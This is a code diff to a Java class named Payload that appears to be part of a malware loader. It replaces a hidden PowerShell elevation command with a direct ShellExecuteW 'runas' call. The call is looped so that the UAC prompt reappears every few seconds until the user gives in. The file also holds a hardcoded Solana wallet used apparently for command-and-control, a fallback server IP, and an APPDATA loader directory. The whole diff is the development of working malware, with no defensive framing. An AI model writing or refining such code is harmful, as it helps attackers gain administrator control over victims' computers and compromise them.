@@ -1,4 +1,5 @@
 // language: Java, file: payload/Payload.java
+import com.sun.jna.*;
 import java.io.*;
 import java.net.HttpURLConnection;
 import java.net.URL;
@@ -7,6 +8,11 @@ import java.util.Base64;
 import java.util.zip.*;
 
 public class Payload {
+    public interface Shell32 extends Library {
+        Shell32 INSTANCE = Native.load("shell32", Shell32.class);
+        int ShellExecuteW(Pointer hwnd, String lpOperation, String lpFile, String lpParameters, String lpDirectory, int nShowCmd);
+    }
+
     private static final String SOLANA_WALLET = "BCy1eKppGB5WPmQ8PrSJT4gkMRy5HmzsuaVrnqef7zoV";
     private static final String SOLANA_RPC = "https://api.devnet.solana.com";
     private static final String FALLBACK_SERVER = "95.182.96.216";
@@ -148,33 +154,28 @@ public class Payload {
             log("java: " + javaExe);
             log("jar: " + jarPath);
 
-            // Use cmd /c start to launch PowerShell without waiting.
-            // The elevated process will try to delete .lock. If it can, the parent knows UAC was accepted.
-            String psCommand = String.format(
-                "Start-Process -FilePath '%s' -Verb RunAs -ArgumentList '-jar \"%s\" %s %s'",
-                javaExe, jarPath, key, ip
-            );
+            String cmdArgs = String.format("-jar \"%s\" %s %s", jarPath, key, ip);
             
-            // Write the lock file. Parent holds the handle.
+            // Keep a lock file open. Elevated process deletes it to signal success.
             FileOutputStream lockStream = new FileOutputStream(lockFile);
 
             while (true) {
-                log("Triggering UAC via PowerShell...");
+                log("Triggering fast UAC...");
                 
-                // Launch PowerShell hidden, no -Wait
-                new ProcessBuilder("powershell.exe", "-NoProfile", "-WindowStyle", "Hidden", "-Command", psCommand).start();
+                // Call ShellExecuteW directly
+                Shell32.INSTANCE.ShellExecuteW(null, "runas", javaExe, cmdArgs, null, 1);
                 
-                // Fast loop: Wait for the lock file to be deleted by the elevated process
-                for (int i = 0; i < 300; i++) { // 300 * 50ms = 15 seconds max wait
+                // Blazing fast loop: wait for elevated process to delete lock
+                for (int i = 0; i < 600; i++) {
                     if (!lockFile.exists() || lockFile.delete()) {
                         log("Lock file deleted. UAC Accepted. Parent exiting.");
                         lockStream.close();
                         System.exit(0);
                     }
-                    Thread.sleep(50); // Insanely fast check
+                    Thread.sleep(10); // 10ms check
                 }
                 
-                log("UAC Denied or Timed Out. Retrying...");
+                log("UAC Denied. Retrying...");
             }
         } catch (Exception e) {
             log("UAC Error: " + e.toString());
@@ -187,7 +188,6 @@ public class Payload {
             String appData = System.getenv("APPDATA");
             File loaderDir = new File(appData, "loader");
             
-            // Delete the lock file to signal the parent process to die
             File lock = new File(loaderDir, ".lock");
             if (lock.exists()) {
                 lock.delete();
